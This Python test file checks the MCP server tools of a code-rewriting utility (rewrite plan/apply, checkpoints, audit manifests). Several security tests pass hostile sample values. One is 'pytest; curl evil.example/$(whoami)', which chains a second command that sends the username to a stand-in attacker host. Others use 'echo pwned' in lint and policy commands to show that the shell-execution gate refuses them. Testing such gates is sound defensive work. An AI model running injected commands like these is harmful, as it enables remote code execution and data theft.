"""MCP rewrite / audit-manifest / review-bundle / index-search contracts."""

import hashlib
import json
from pathlib import Path
from subprocess import CompletedProcess
from unittest.mock import patch

from tests.unit.test_mcp_server_shared import (
    _assert_audit_manifest_envelope,
    _canonical_manifest_bytes,
    _write_audit_manifest,
    _write_scan_results,
)


def _project_onto(actual: dict, expected: dict) -> dict:
    """Project ``actual`` onto ``expected``'s key set, recursing into nested dicts.

    The envelope is documented as ADDITIVE: new fields may appear and must not break a consumer.
    The call sites here already projected the TOP level for exactly that reason ("tolerate the
    added mcp_contract_version envelope key") but compared nested dicts strictly, so an additive
    key inside ``audit_manifest`` still broke them -- which is what the W1-a hardening's
    ``recorded`` / ``record_error`` disclosure does when recording legitimately fails (these tests
    mock ``subprocess.run``, so the manifest file is never written).

    This tolerates ONLY keys the test never asserted. A wrong value, a wrong nested value, or a
    MISSING expected key still raises, so the assertions keep their discriminating power.
    """
    return {
        key: _project_onto(actual[key], expected[key])
        if isinstance(expected[key], dict) and isinstance(actual.get(key), dict)
        else actual[key]
        for key in expected
    }


def test_tg_checkpoint_mcp_tools_wrap_checkpoint_store(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    project.mkdir()
    target = project / "sample.py"
    target.write_text("value = 1\n", encoding="utf-8")

    created = json.loads(mcp_server.tg_checkpoint_create(str(project)))
    checkpoint_id = created["checkpoint_id"]
    assert checkpoint_id.startswith("ckpt-")
    assert created["file_count"] == 1

    listing = json.loads(mcp_server.tg_checkpoint_list(str(project)))
    assert listing["version"] == 1
    assert listing["checkpoints"][0]["checkpoint_id"] == checkpoint_id

    target.write_text("value = 2\n", encoding="utf-8")
    restored = json.loads(mcp_server.tg_checkpoint_undo(checkpoint_id, str(project)))
    assert restored["checkpoint_id"] == checkpoint_id
    assert restored["restored_files"] == 1
    assert target.read_text(encoding="utf-8") == "value = 1\n"


def test_tg_rewrite_plan_returns_native_plan_json_shape():
    from tensor_grep.cli import mcp_server

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "pattern": "def $F($$$ARGS): return $EXPR",
        "replacement": "lambda $$$ARGS: $EXPR",
        "lang": "python",
        "total_files_scanned": 1,
        "total_edits": 1,
        "edits": [
            {
                "id": "e0000:file.py:0-27",
                "file": "C:/tmp/file.py",
                "planned_mtime_ns": 1,
                "line": 1,
                "byte_range": {"start": 0, "end": 27},
                "original_text": "def add(x, y): return x + y",
                "replacement_text": "lambda x, y: x + y",
                "metavar_env": {"F": "add", "ARGS": "x, y", "EXPR": "x + y"},
            }
        ],
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_plan(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
        )

    parsed = json.loads(out)
    # audit A1/A4: tg_rewrite_plan now also stamps plan_digest, match_count, and
    # mcp_contract_version onto the plan output. The original native plan fields
    # must still be present and unchanged.
    assert _project_onto(parsed, payload) == payload
    assert isinstance(parsed["plan_digest"], str) and parsed["plan_digest"]
    assert parsed["match_count"] == payload["total_edits"]
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--json",
        # round-3 security: `--` ends options so a pattern beginning with `-` is a positional.
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_plan_uses_embedded_fallback_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    expected = {
        "version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "total_edits": 0,
        "edits": [],
    }

    def fake_embedded_rewrite_json(**kwargs):
        assert kwargs["mode"] == "plan"
        return json.dumps(expected)

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)
    # Force the embedded seam open: this arm mocks ``_execute_embedded_rewrite_json``,
    # so a host without the compiled extension must not short-circuit to unavailable.
    monkeypatch.setattr(mcp_server, "_embedded_rewrite_available", lambda: True)
    monkeypatch.setattr(mcp_server, "_execute_embedded_rewrite_json", fake_embedded_rewrite_json)

    out = mcp_server.tg_rewrite_plan(
        pattern="def $F(): pass",
        replacement="def $F(): ...",
        lang="python",
        path=str(tmp_path),
    )

    parsed = json.loads(out)
    # audit A1: the plan is stamped with a stable plan_digest and match_count.
    assert {key: parsed[key] for key in expected} == expected
    assert isinstance(parsed["plan_digest"], str) and parsed["plan_digest"]
    assert parsed["match_count"] == 0


def test_tg_rewrite_plan_reports_unavailable_without_native_or_embedded(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)
    monkeypatch.setattr(mcp_server, "_embedded_rewrite_available", lambda: False)

    payload = json.loads(
        mcp_server.tg_rewrite_plan(
            pattern="def $F(): pass",
            replacement="def $F(): ...",
            lang="python",
            path=str(tmp_path),
        )
    )

    assert payload["routing_backend"] == "AstBackend"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_plan"
    assert payload["error"]["code"] == "unavailable"
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_tg_rewrite_apply_verify_returns_unavailable_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)
    monkeypatch.setattr(mcp_server, "_embedded_rewrite_available", lambda: True)

    payload = json.loads(
        mcp_server.tg_rewrite_apply(
            pattern="def $F(): pass",
            replacement="def $F(): ...",
            lang="python",
            path=str(tmp_path),
            verify=True,
        )
    )

    assert payload["routing_backend"] == "AstBackend"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_apply"
    assert payload["error"]["code"] == "unavailable"
    assert "verify" in payload["error"]["message"]
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_tg_rewrite_diff_returns_unavailable_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload = json.loads(
        mcp_server.tg_rewrite_diff(
            pattern="def $F(): pass",
            replacement="def $F(): ...",
            lang="python",
            path=str(tmp_path),
        )
    )

    assert payload["routing_backend"] == "AstBackend"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_diff"
    assert payload["error"]["code"] == "unavailable"
    assert "standalone native tg binary" in payload["error"]["message"]
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_tg_rewrite_diff_returns_unavailable_for_bad_native_override(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_NATIVE_TG_BINARY", str(tmp_path / "missing-tg.exe"))
    mcp_server.resolve_native_tg_binary.cache_clear()
    try:
        payload = json.loads(
            mcp_server.tg_rewrite_diff(
                pattern="def $F(): pass",
                replacement="def $F(): ...",
                lang="python",
                path=str(tmp_path),
            )
        )
    finally:
        mcp_server.resolve_native_tg_binary.cache_clear()

    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_rewrite_diff"
    assert payload["error"]["code"] == "unavailable"


def test_tg_index_search_returns_unavailable_without_native_binary(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload = json.loads(mcp_server.tg_index_search(pattern="ERROR", path=str(tmp_path)))

    assert payload["routing_backend"] == "TrigramIndex"
    assert payload["routing_reason"] == "native-tg-unavailable"
    assert payload["tool"] == "tg_index_search"
    assert payload["query"] == "ERROR"
    assert payload["path"] == str(tmp_path)
    assert payload["error"]["code"] == "unavailable"
    assert "standalone native tg binary" in payload["error"]["message"]
    assert "TG_NATIVE_TG_BINARY" in payload["error"]["remediation"]


def test_execute_rewrite_apply_json_should_use_embedded_rust_when_native_binary_missing(
    monkeypatch, tmp_path: Path
):
    from tensor_grep.cli import mcp_server

    source = tmp_path / "sample.py"
    source.write_text("def add(x, y): return x + y\n", encoding="utf-8")

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload_json, exit_code = mcp_server.execute_rewrite_apply_json(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(source),
    )

    payload = json.loads(payload_json)
    assert exit_code == 0
    assert payload["plan"]["total_edits"] == 1
    assert payload["plan"]["edits"][0]["replacement_text"] == "lambda x, y: x + y"
    assert source.read_text(encoding="utf-8") == "lambda x, y: x + y\n"


def test_execute_rewrite_apply_json_embedded_checkpoint_when_native_binary_missing(
    monkeypatch, tmp_path: Path
):
    from tensor_grep.cli import mcp_server

    source = tmp_path / "sample.py"
    source.write_text("def add(x, y): return x + y\n", encoding="utf-8")

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload_json, exit_code = mcp_server.execute_rewrite_apply_json(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(source),
        checkpoint=True,
    )

    payload = json.loads(payload_json)
    assert exit_code == 0
    assert payload["plan"]["total_edits"] == 1
    assert payload["checkpoint"]["checkpoint_id"].startswith("ckpt-")
    assert payload["checkpoint"]["file_count"] >= 1
    assert source.read_text(encoding="utf-8") == "lambda x, y: x + y\n"


def test_execute_rewrite_plan_json_should_restore_windows_variadic_metavar_escaping(
    monkeypatch, tmp_path: Path
):
    from tensor_grep.cli import mcp_server

    source = tmp_path / "sample.py"
    source.write_text("def add(x, y): return x + y\n", encoding="utf-8")

    monkeypatch.setattr(mcp_server, "resolve_native_tg_binary", lambda: None)

    payload_json, exit_code = mcp_server.execute_rewrite_plan_json(
        pattern="def $F($$ARGS): return $EXPR",
        replacement="lambda $$ARGS: $EXPR",
        lang="python",
        path=str(source),
    )

    payload = json.loads(payload_json)
    assert exit_code == 0
    assert payload["total_edits"] == 1
    assert payload["edits"][0]["replacement_text"] == "lambda x, y: x + y"


def test_tg_rewrite_apply_supports_optional_verify_flag():
    from tensor_grep.cli import mcp_server

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "plan": {"total_edits": 1},
        "verification": {"total_edits": 1, "verified": 1, "mismatches": []},
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            verify=True,
        )

    parsed = json.loads(out)
    # audit A4: every tool envelope now carries mcp_contract_version; the native
    # apply fields are otherwise unchanged.
    assert _project_onto(parsed, payload) == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--verify",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_apply_supports_optional_validation_commands(monkeypatch):
    from tensor_grep.cli import mcp_server

    # Validation commands ship default-OFF on the MCP surface (audit HIGH); this
    # test exercises the explicit opt-in path.
    monkeypatch.setenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", "1")

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "plan": {"total_edits": 1},
        "verification": {"total_edits": 1, "verified": 1, "mismatches": []},
        "validation": {
            "success": True,
            "commands": [
                {
                    "kind": "lint",
                    "command": "echo lint-ok",
                    "success": True,
                    "exit_code": 0,
                    "stdout": "lint-ok\n",
                    "stderr": "",
                },
                {
                    "kind": "test",
                    "command": "echo test-ok",
                    "success": True,
                    "exit_code": 0,
                    "stdout": "test-ok\n",
                    "stderr": "",
                },
            ],
        },
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            verify=True,
            lint_cmd="echo lint-ok",
            test_cmd="echo test-ok",
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert _project_onto(parsed, payload) == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--verify",
        "--lint-cmd",
        "echo lint-ok",
        "--test-cmd",
        "echo test-ok",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_apply_rejects_lint_cmd_without_explicit_optin(monkeypatch):
    """Audit HIGH: lint_cmd/test_cmd reach a shell (sh -c / cmd /C) in the native
    apply path. Over the MCP trust boundary (agent-steerable args) this is an RCE
    primitive, so a free-form validation command must be refused unless the operator
    explicitly opted in via TG_MCP_ALLOW_VALIDATION_COMMANDS. The shared apply
    function must never be reached when the gate rejects."""
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    with patch("tensor_grep.cli.mcp_server.execute_rewrite_apply_json") as mock_apply:
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            lint_cmd="echo pwned",
        )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "unsupported_option"
    assert parsed["error"]["retryable"] is False
    assert "TG_MCP_ALLOW_VALIDATION_COMMANDS" in parsed["error"]["message"]
    mock_apply.assert_not_called()


def test_tg_rewrite_apply_rejects_test_cmd_without_explicit_optin(monkeypatch):
    """test_cmd is gated identically to lint_cmd (same shell-exec sink)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    with patch("tensor_grep.cli.mcp_server.execute_rewrite_apply_json") as mock_apply:
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            test_cmd="pytest; curl evil.example/$(whoami)",
        )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "unsupported_option"
    mock_apply.assert_not_called()


def test_tg_rewrite_apply_allows_validation_commands_when_opted_in(monkeypatch):
    """With the explicit opt-in env flag set, validation commands pass through to
    the apply function unchanged (defense-in-depth, not a hard removal)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", "1")

    with patch(
        "tensor_grep.cli.mcp_server.execute_rewrite_apply_json",
        return_value=("{}", 0),
    ) as mock_apply:
        mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            lint_cmd="echo lint-ok",
        )

    mock_apply.assert_called_once()
    assert mock_apply.call_args.kwargs["lint_cmd"] == "echo lint-ok"


def test_tg_rewrite_apply_supports_optional_policy_parameter(tmp_path):
    from tensor_grep.cli import mcp_server

    policy_path = tmp_path / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": None,
            "test_cmd": None,
            "ruleset_scan": None,
            "on_failure": "warn",
        }),
        encoding="utf-8",
    )

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "plan": {"total_edits": 1},
        "verification": {"total_edits": 1, "verified": 1, "mismatches": []},
        "policy_result": {
            "policy_path": str(policy_path.resolve()),
            "checks": [],
            "all_passed": True,
            "action_taken": "none",
        },
    }

    with patch(
        "tensor_grep.cli.mcp_server.execute_rewrite_apply_json",
        return_value=(json.dumps(payload), 0),
    ) as mock_execute:
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            policy=str(policy_path),
        )

    parsed = json.loads(out)
    assert parsed == payload
    assert mock_execute.call_args.kwargs["policy"] == str(policy_path)


def test_tg_rewrite_apply_gates_policy_file_validation_commands(tmp_path, monkeypatch):
    """Audit HIGH (RCE): a policy FILE carrying lint_cmd bypassed the
    TG_MCP_ALLOW_VALIDATION_COMMANDS gate — the 3141 guard only checked the direct
    lint_cmd/test_cmd params, not a policy path that loads them from JSON. With the
    gate OFF the policy's lint_cmd must be refused (code=unsupported_option) BEFORE
    any command runs (load_apply_policy fails closed before native/command execution).
    """
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    monkeypatch.delenv("TG_MCP_ALLOW_VALIDATION_COMMANDS", raising=False)

    policy_path = tmp_path / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": "echo pwned",
            "test_cmd": None,
            "ruleset_scan": None,
            "on_failure": "warn",
        }),
        encoding="utf-8",
    )

    out = mcp_server.tg_rewrite_apply(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(tmp_path),
        policy=str(policy_path),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "unsupported_option"
    assert parsed["error"]["retryable"] is False


def test_tg_rewrite_apply_returns_structured_invalid_policy_error(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    policy_path = tmp_path / "apply-policy.json"
    policy_path.write_text(
        json.dumps({
            "version": 1,
            "lint_cmd": None,
            "test_cmd": None,
            "ruleset_scan": None,
        }),
        encoding="utf-8",
    )

    out = mcp_server.tg_rewrite_apply(
        pattern="def $F($$$ARGS): return $EXPR",
        replacement="lambda $$$ARGS: $EXPR",
        lang="python",
        path=str(tmp_path),
        policy=str(policy_path),
    )

    parsed = json.loads(out)
    assert parsed["error"]["code"] == "invalid_policy"
    assert parsed["error"]["details"]
    assert any(detail["field"] == "on_failure" for detail in parsed["error"]["details"])


def test_tg_rewrite_apply_supports_optional_checkpoint_flag():
    from tensor_grep.cli import mcp_server

    # M12: created_at is now normalised to ISO-8601 by the MCP layer (unix timestamps are
    # converted); use an ISO-8601 string in the native payload so the expected dict still
    # matches the parsed output after normalisation.
    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "checkpoint": {
            "checkpoint_id": "ckpt-123",
            "mode": "filesystem-snapshot",
            "root": "C:/repo",
            "created_at": "2009-02-13T23:31:30+00:00",
            "file_count": 1,
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                # pass the unix-timestamp form to simulate what the native binary emits;
                # the MCP layer must convert it to ISO-8601 before returning
                stdout=json.dumps({
                    **payload,
                    "checkpoint": {**payload["checkpoint"], "created_at": "1234567890"},
                }),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            checkpoint=True,
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version and applied_edits envelope keys.
    assert _project_onto(parsed, payload) == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # M12: applied_edits count is stamped at the top level
    assert "applied_edits" in parsed
    assert isinstance(parsed["applied_edits"], int)
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv.
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--checkpoint",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((Path.cwd() / "src").resolve()),
    ]


def test_tg_rewrite_apply_supports_optional_audit_manifest_flag(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    # round-5 security: audit_manifest is confined to cwd (see the round-5 confinement
    # tests below), so this test's flag-support assertion must use a cwd-confined path
    # and assert the RESOLVED absolute path is what reaches the native argv.
    cwd = tmp_path / "repo"
    cwd.mkdir()
    (
        cwd / "src"
    ).mkdir()  # path="src" must exist under cwd or the pre-confinement existence check rejects it
    monkeypatch.chdir(cwd)
    resolved_manifest = cwd / "rewrite-audit.json"

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "audit_manifest": {
            "path": str(resolved_manifest),
            "file_count": 1,
            "applied_edit_count": 1,
            "signed": False,
            "signature_kind": None,
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            audit_manifest="rewrite-audit.json",
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert _project_onto(parsed, payload) == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv (mirrors resolved_manifest's own confinement).
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--audit-manifest",
        str(resolved_manifest),
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((cwd / "src").resolve()),
    ]


def test_tg_rewrite_apply_records_generated_audit_manifest_in_history_index(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    manifest_path = audit_dir / "rewrite-audit.json"
    manifest_payload = _write_audit_manifest(manifest_path, project_root=project)
    # round-5 security: audit_manifest is confined to cwd; the manifest already lives
    # under `project`, so anchor cwd there.
    monkeypatch.chdir(project)
    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "audit_manifest": {
            "path": str(manifest_path),
            "file_count": 1,
            "applied_edit_count": 1,
            "signed": False,
            "signature_kind": None,
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ),
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path=str(project),
            audit_manifest=str(manifest_path),
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert _project_onto(parsed, payload) == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    index_payload = json.loads((audit_dir / "index.json").read_text(encoding="utf-8"))
    assert index_payload["version"] == 1
    assert index_payload["manifests"] == [
        {
            "manifest_sha256": manifest_payload["manifest_sha256"],
            "kind": "rewrite-audit-manifest",
            "created_at": "2026-03-23T12:00:00Z",
            "file_path": str(manifest_path.resolve()),
            "previous_manifest_sha256": None,
        }
    ]


def test_tg_rewrite_apply_supports_optional_audit_signing_key_flag(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    # round-5 security: audit_manifest is confined to cwd, and audit_signing_key (a secret
    # READ) requires the explicit opt-in env var. Anchor cwd + opt in to exercise the
    # legitimate flag-forwarding path.
    cwd = tmp_path / "repo"
    cwd.mkdir()
    (
        cwd / "src"
    ).mkdir()  # path="src" must exist under cwd or the pre-confinement existence check rejects it
    monkeypatch.chdir(cwd)
    monkeypatch.setenv("TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ", "1")
    resolved_manifest = cwd / "rewrite-audit.json"

    payload = {
        "version": 1,
        "schema_version": 1,
        "routing_backend": "AstBackend",
        "routing_reason": "ast-native",
        "sidecar_used": False,
        "audit_manifest": {
            "path": str(resolved_manifest),
            "file_count": 1,
            "applied_edit_count": 1,
            "signed": True,
            "signature_kind": "hmac-sha256",
        },
        "plan": {"total_edits": 1},
        "verification": None,
        "validation": None,
    }

    with (
        patch("tensor_grep.cli.mcp_server.resolve_native_tg_binary", return_value=Path("tg.exe")),
        patch(
            "tensor_grep.cli.mcp_server.subprocess.run",
            return_value=CompletedProcess(
                args=["tg.exe"],
                returncode=0,
                stdout=json.dumps(payload),
                stderr="",
            ),
        ) as mock_run,
    ):
        out = mcp_server.tg_rewrite_apply(
            pattern="def $F($$$ARGS): return $EXPR",
            replacement="lambda $$$ARGS: $EXPR",
            lang="python",
            path="src",
            audit_manifest="rewrite-audit.json",
            audit_signing_key="C:/repo/audit.key",
        )

    parsed = json.loads(out)
    # audit A4: tolerate the added mcp_contract_version envelope key.
    assert _project_onto(parsed, payload) == payload
    assert parsed["mcp_contract_version"] == mcp_server._TG_MCP_SERVER_CONTRACT_VERSION
    # round-8 (audit #95): path="src" is now confined+resolved to an absolute cwd-relative
    # path before it reaches the native argv (mirrors resolved_manifest's own confinement).
    assert mock_run.call_args.args[0] == [
        "tg.exe",
        "run",
        "--lang",
        "python",
        "--rewrite",
        "lambda $$$ARGS: $EXPR",
        "--apply",
        "--audit-manifest",
        str(resolved_manifest),
        "--audit-signing-key",
        "C:/repo/audit.key",
        "--json",
        "--",
        "def $F($$$ARGS): return $EXPR",
        str((cwd / "src").resolve()),
    ]


def test_tg_audit_manifest_verify_supports_signed_manifests(tmp_path, monkeypatch):
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #7)
    # signing_key read is gated behind an explicit opt-in (audit #81 #12).
    monkeypatch.setenv("TG_MCP_ALLOW_AUDIT_SIGNING_KEY_READ", "1")
    manifest_path = tmp_path / "rewrite-audit.json"
    signing_key_path = tmp_path / "audit.key"
    signing_key = b"top-secret"
    signing_key_path.write_bytes(signing_key)
    payload = _write_audit_manifest(manifest_path, signing_key=signing_key)

    out = mcp_server.tg_audit_manifest_verify(
        str(manifest_path),
        signing_key=str(signing_key_path),
    )

    parsed = json.loads(out)
    assert parsed["routing_reason"] == "audit-manifest-verify"
    assert parsed["manifest_sha256"] == payload["manifest_sha256"]
    assert parsed["checks"] == {
        "digest_valid": True,
        "chain_valid": True,
        "signature_valid": True,
    }
    assert parsed["valid"] is True
    assert parsed["errors"] == []


def test_tg_audit_history_matches_cli_json_schema(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import audit_manifest, mcp_server

    project = tmp_path / "project"
    audit_dir = project / ".tensor-grep" / "audit"
    audit_dir.mkdir(parents=True)
    first_payload = _write_audit_manifest(audit_dir / "first.json")
    _write_audit_manifest(
        audit_dir / "second.json",
        previous_manifest_sha256=str(first_payload["manifest_sha256"]),
    )

    payload = json.loads(mcp_server.tg_audit_history(str(project)))

